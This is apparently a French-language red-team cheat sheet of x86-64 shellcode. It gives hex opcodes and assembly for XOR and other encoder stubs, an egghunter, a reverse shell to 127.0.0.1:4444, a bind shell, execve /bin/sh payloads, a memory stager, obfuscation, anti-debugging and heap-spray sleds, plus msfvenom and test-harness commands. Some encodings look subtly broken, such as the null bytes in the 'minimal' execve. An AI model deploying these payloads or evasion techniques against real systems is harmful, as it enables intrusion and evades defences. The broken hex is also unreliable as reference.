# Cheatsheet Shellcode Reference - Red Team Edition

## Opcodes Essentiels x86-64

### NOP Variants
```
Classic NOP:
0x90                    nop

Multi-byte NOPs (Intel recommended):
0x66 0x90              nop (2 bytes)
0x0F 0x1F 0x00         nop (3 bytes)
0x0F 0x1F 0x40 0x00    nop (4 bytes)

Polymorphic NOPs:
0x48 0x87 0xC0         xchg rax, rax
0x48 0x89 0xC0         mov rax, rax
0x48 0x8D 0x00         lea rax, [rax]
0x97                   xchg eax, edi
```

### Syscall
```
Linux x64:
0x0F 0x05              syscall

Legacy x86:
0xCD 0x80              int 0x80

Windows x64:
0x0F 0x05              syscall (direct)
0x0F 0x34              sysenter (fast call)
```

### Jumps
```
Short jumps (-128 to +127):
0xEB [rel8]            jmp short
0x74 [rel8]            je/jz short
0x75 [rel8]            jne/jnz short
0x7C [rel8]            jl short
0x7F [rel8]            jg short

Near jumps:
0xE9 [rel32]           jmp near
0xE8 [rel32]           call near

Indirect:
0xFF 0xE0              jmp rax
0xFF 0xD0              call rax
```

### Register Operations
```
Zero register:
0x31 0xC0              xor eax, eax
0x48 0x31 0xC0         xor rax, rax
0x33 0xC0              xor eax, eax (alt encoding)

Increment:
0x48 0xFF 0xC0         inc rax
0x40                   inc eax (x86 only)

Clear register (alternative):
0x48 0x29 0xC0         sub rax, rax
0x48 0x21 0xC0         and rax, rax
```

### Stack Operations
```
Push:
0x50-0x57              push rax-rdi
0x51                   push rcx
0x56                   push rsi

Pop:
0x58-0x5F              pop rax-rdi
0x59                   pop rcx
0x5E                   pop rsi

0x9C                   pushfq
0x9D                   popfq
```

### Move Operations
```
0x48 0x89 0xC0         mov rax, rax
0x48 0xB8 [imm64]      mov rax, imm64
0xB0 [imm8]            mov al, imm8
0xB8 [imm32]           mov eax, imm32
0x8B 0x00              mov eax, [rax]
0x89 0x00              mov [rax], eax
```

## Shellcode Encoders

### XOR Encoder
```nasm
; Encoder (génération)
key = 0xAA
encoded = [byte ^ key for byte in shellcode]

; Decoder stub
decoder:
    jmp short call_decoder

decode:
    pop rsi                 ; 5E
    xor rcx, rcx           ; 48 31 C9
    add cx, SHELLCODE_LEN  ; 66 81 C1 [len]

decode_loop:
    xor byte [rsi], 0xAA   ; 80 36 AA
    inc rsi                ; 48 FF C6
    loop decode_loop       ; E2 FA
    jmp rsi                ; FF E6

call_decoder:
    call decode            ; E8 [rel32]
    ; Shellcode encodé suit
```

Opcodes:
```
5E                     pop rsi
48 31 C9               xor rcx, rcx
66 81 C1 [XX XX]       add cx, imm16
80 36 [KEY]            xor byte [rsi], key
48 FF C6               inc rsi
E2 FA                  loop (rel8 = -6)
FF E6                  jmp rsi
E8 [XX XX XX XX]       call rel32
```

### ADD/SUB Encoder
```nasm
decoder:
    pop rsi
    xor ecx, ecx
    mov cl, LEN

decode_loop:
    sub byte [rsi], 0x13   ; 80 2E 13
    inc rsi
    loop decode_loop
```

### NOT Encoder
```nasm
decode_loop:
    not byte [rsi]         ; F6 16
    inc rsi
    loop decode_loop
```

### ROL/ROR Encoder
```nasm
decode_loop:
    rol byte [rsi], 3      ; C0 06 03
    inc rsi
    loop decode_loop
```

## Egghunter Shellcode

### Linux x64 Egghunter
```nasm
; Cherche signature "W00TW00T" en mémoire

egghunter:
    xor rdx, rdx           ; 48 31 D2
    xor rdi, rdi           ; 48 31 FF

next_page:
    or dx, 0x0fff          ; 66 81 CA FF 0F

next_addr:
    inc rdx                ; 48 FF C2
    lea rdi, [rdx+0x4]     ; 48 8D 7A 04

    ; access syscall pour vérifier page accessible
    mov al, 21             ; B0 15 (sys_access)
    syscall                ; 0F 05

    cmp al, 0xf2           ; 3C F2 (EFAULT)
    je next_page           ; 74 XX

    mov eax, 0x54303057    ; B8 57 30 30 54 ("W00T")
    mov edi, edx
    scasd                  ; AF (compare EAX avec [RDI])
    jnz next_addr          ; 75 XX

    scasd                  ; Vérifier 2e moitié
    jnz next_addr

    jmp rdi                ; FF E7 (shellcode trouvé)
```

Opcodes complets:
```
48 31 D2 48 31 FF 66 81 CA FF 0F 48 FF C2 48 8D 7A 04
B0 15 0F 05 3C F2 74 EC B8 57 30 30 54 8B FA AF 75 E7
AF 75 E4 FF E7
```

## Reverse Shell Templates

### Linux x64 (127.0.0.1:4444)
```
Opcodes complets:
48 31 C0 B0 29 48 31 FF 40 B7 02 48 31 F6 40 B6 01
48 31 D2 0F 05 48 89 C7 48 31 C0 B0 2A 48 83 EC 10
48 C7 04 24 7F 00 00 01 66 C7 44 24 02 11 5C 66 C7
04 24 02 00 48 89 E6 48 31 D2 B2 10 0F 05 48 31 F6
B0 21 0F 05 48 FF C6 48 83 FE 03 75 F2 48 31 F6 56
48 BF 2F 62 69 6E 2F 73 68 00 57 48 89 E7 48 31 D2
B0 3B 0F 05

Taille: ~110 bytes
```

### Windows x64 (WinExec "cmd.exe")
```
Shellcode minimal (nécessite kernel32.dll chargé):

; Résoudre WinExec via PEB walking
48 31 C0 65 48 8B 40 60 48 8B 40 18 48 8B 40 20
48 8B 00 48 8B 00 48 8B 40 20 48 89 C3
; [Parse PE headers...]
; [Find WinExec...]

; Call WinExec
48 83 EC 28
48 8D 0D [cmd_str offset]
BA 01 00 00 00
FF D0
48 83 C4 28

cmd_str: "cmd.exe", 0
```

## Bad Characters

### Caractères à éviter (contexte dépendant)

#### NULL byte (0x00)
```
Problème: String terminators
Solution:
  - Utiliser XOR pour zéro: xor eax, eax
  - Utiliser SUB: sub eax, eax
  - Utiliser MOV partiel: mov al, 5 (au lieu de mov rax, 5)
```

#### Newline (0x0A)
```
Problème: Input parsing
Solution: Encoder ou éviter dans immediates
```

#### Carriage Return (0x0D)
```
Problème: Windows text mode
Solution: Même que 0x0A
```

### Bad Char Testing
```python
# Générer tous bytes sauf bad chars
bad_chars = [0x00, 0x0a, 0x0d]
shellcode = bytes(i for i in range(256) if i not in bad_chars)
```

## Position-Independent Shellcode

### Call/Pop Technique
```nasm
jmp short call_shellcode

shellcode:
    pop rsi                ; RSI = adresse après CALL
    ; Utiliser RSI comme base pour data

call_shellcode:
    call shellcode
    db "data here"

Opcodes:
EB [offset]                ; jmp short
E8 [rel32]                 ; call
[data bytes]
```

### RIP-Relative (x64)
```nasm
lea rax, [rel data]        ; 48 8D 05 [rel32]
mov rbx, [rel var]         ; 48 8B 1D [rel32]

data: db "string"
var: dq 0x1337
```

### FPU GetPC (legacy)
```nasm
fldz                       ; D9 EE
fnstenv [esp-12]           ; D9 74 24 F4
pop eax                    ; 58
; EAX = EIP courante
```

## Shellcode Obfuscation

### Junk Insertion
```nasm
; Code original
xor eax, eax
mov al, 59

; Avec junk
xor eax, eax
nop                        ; Junk
push rbx                   ; Junk
pop rbx                    ; Junk
mov al, 59
```

### Instruction Substitution
```nasm
; Original
xor eax, eax

; Substitutions
sub eax, eax               ; 29 C0
and eax, 0                 ; 25 00 00 00 00 (bad: null bytes)
imul eax, 0                ; 6B C0 00 (bad: null byte)
```

### Register Permutation
```nasm
; Variante 1
xor eax, eax
mov al, 59

; Variante 2
xor ebx, ebx
mov bl, 59
mov rax, rbx
```

### Control Flow Obfuscation
```nasm
; Original
mov rax, 59
syscall

; Obfusqué
jmp label1
label2:
    syscall
    jmp end
label1:
    mov rax, 59
    jmp label2
end:
```

## Metamorphic Techniques

### Dynamic Key XOR
```nasm
; Key générée dynamiquement
rdtsc                      ; Timestamp dans EDX:EAX
and al, 0xFF               ; Mask pour key
mov bl, al                 ; Save key

decode_loop:
    xor byte [rsi], bl
    inc rsi
    loop decode_loop
```

### Polymorphic Decoder
```nasm
; Chaque génération utilise registres différents
; Version 1: RSI
pop rsi
xor ecx, ecx

; Version 2: RDI
pop rdi
xor ebx, ebx

; Version 3: RBX
pop rbx
xor edx, edx
```

## Packing/Compression

### Simple RLE (Run-Length Encoding)
```nasm
decoder:
    pop rsi                ; Source (packed)
    lea rdi, [rsi+100]     ; Dest (après packed data)

rle_loop:
    lodsb                  ; AL = count
    test al, al
    jz done
    mov cl, al             ; Count

    lodsb                  ; AL = byte value
rep_loop:
    stosb                  ; Repeat
    loop rep_loop
    jmp rle_loop

done:
    jmp rdi                ; Execute unpacked
```

## Syscall Shellcode Templates

### Linux x64 execve("/bin/sh")
```
Minimal (27 bytes):
48 31 F6 56 48 BF 2F 62 69 6E 2F 73 68 00 57 48
89 E7 48 31 D2 B0 3B 0F 05

Décodé:
xor rsi, rsi
push rsi
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor rdx, rdx
mov al, 59
syscall
```

### Linux x64 Bind Shell (port 4444)
```
Opcodes (~150 bytes):
[socket()] 48 31 C0 B0 29 48 31 FF 40 B7 02 48 31 F6 40 B6 01 48 31 D2 0F 05
[save sockfd] 48 89 C7
[bind()] 48 31 C0 B0 31 48 83 EC 10 48 C7 04 24 00 00 00 00 66 C7 44 24 02 11 5C 66 C7 04 24 02 00 48 89 E6 48 31 D2 B2 10 0F 05
[listen()] 48 31 C0 B0 32 48 31 F6 40 B6 01 0F 05
[accept()] 48 31 C0 B0 2B 48 31 F6 48 31 D2 0F 05
[dup2 loop + execve comme reverse shell]
```

### macOS x64 execve("/bin/sh")
```
Minimal (31 bytes):
48 31 F6 56 48 BF 2F 62 69 6E 2F 73 68 00 57 48
89 E7 48 31 D2 B8 3B 00 00 02 0F 05

Différence: syscall number = 0x200003B (BSD prefix)
```

## Staged Shellcode

### Stage 1 (Stager - lit stage 2)
```nasm
; Mmap RWX memory
mov rax, 9                 ; sys_mmap
xor rdi, rdi               ; addr = NULL
mov rsi, 0x1000            ; len = 4096
mov rdx, 7                 ; prot = RWX
mov r10, 0x22              ; flags = MAP_PRIVATE|MAP_ANON
mov r8, -1                 ; fd = -1
xor r9, r9                 ; offset = 0
syscall
mov r9, rax                ; Save mmap addr

; Read stage 2
xor rax, rax               ; sys_read
xor rdi, rdi               ; fd = stdin
mov rsi, r9                ; buf = mmap
mov rdx, 0x1000            ; count
syscall

; Execute stage 2
jmp r9
```

Opcodes:
```
48 C7 C0 09 00 00 00 48 31 FF 48 C7 C6 00 10 00 00
BA 07 00 00 00 49 C7 C2 22 00 00 00 49 C7 C0 FF FF
FF FF 4D 31 C9 0F 05 49 89 C1 48 31 C0 48 31 FF 4C
89 CE BA 00 10 00 00 0F 05 41 FF E1
```

## Anti-Debugging Shellcode

### RDTSC Check
```nasm
rdtsc                      ; 0F 31
mov esi, eax
; Code sensible
rdtsc
sub eax, esi
cmp eax, 0x1000            ; 3D 00 10 00 00
ja exit                    ; 77 XX
```

### INT3 Detection
```nasm
xor eax, eax
int3                       ; 0xCC
inc eax
; Si debugger: EAX reste 0 (handler appelé)
test eax, eax
jz exit
```

## Heap Spray Shellcode

### NOP Sled
```
Pattern répété:
90 90 90 90 90 90 90 90 ... [shellcode]

Alternative (polymorphic):
48 31 C0 48 31 C0 48 31 C0 ... [shellcode]
```

## Tips Encodage

### Éviter NULL dans immediates
```nasm
; Mauvais
mov rax, 1                 ; 48 C7 C0 01 00 00 00 (nulls!)

; Bon
xor eax, eax               ; 31 C0
inc eax                    ; FF C0
; Ou
push 1                     ; 6A 01
pop rax                    ; 58
```

### Éviter NULL dans syscall number
```nasm
; Au lieu de mov rax, 59
xor eax, eax
mov al, 59                 ; Seulement 1 byte

; Ou
push 59
pop rax
```

### Encoder strings
```nasm
; Au lieu de DB directe
mov rax, 0x68732f6e69622f
push rax

; Ou XOR encoded
mov rax, 0x68732f6e69622f ^ 0xAAAAAAAAAAAAAAAA
mov rbx, 0xAAAAAAAAAAAAAAAA
xor rax, rbx
push rax
```

## Outils

### Génération shellcode
```bash
# msfvenom
msfvenom -p linux/x64/exec CMD=/bin/sh -f c

# Pwntools (Python)
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# Shellnoob
shellnoob -i shellcode.asm -o shellcode.bin
```

### Testing
```c
// Test harness
unsigned char shellcode[] = "\x48\x31\xf6...";

int main() {
    void (*func)() = (void(*)())shellcode;
    func();
    return 0;
}
```

### Extraction depuis binaire
```bash
objcopy -O binary -j .text shellcode shellcode.bin
xxd -i shellcode.bin
# Ou
hexdump -v -e '"\\x" 1/1 "%02x"' shellcode.bin
```

## Shellcode Database

### Common sizes
```
Execve /bin/sh:       ~27 bytes (Linux x64)
Reverse shell:        ~90-120 bytes
Bind shell:           ~130-160 bytes
Egghunter:            ~32-40 bytes
Stager (read+exec):   ~50-60 bytes
```

### Shellcode repositories
```
Shell-Storm:     http://shell-storm.org/shellcode/
Exploit-DB:      https://www.exploit-db.com/shellcodes
Metasploit:      msfvenom payloads
Pwntools:        shellcraft library
```
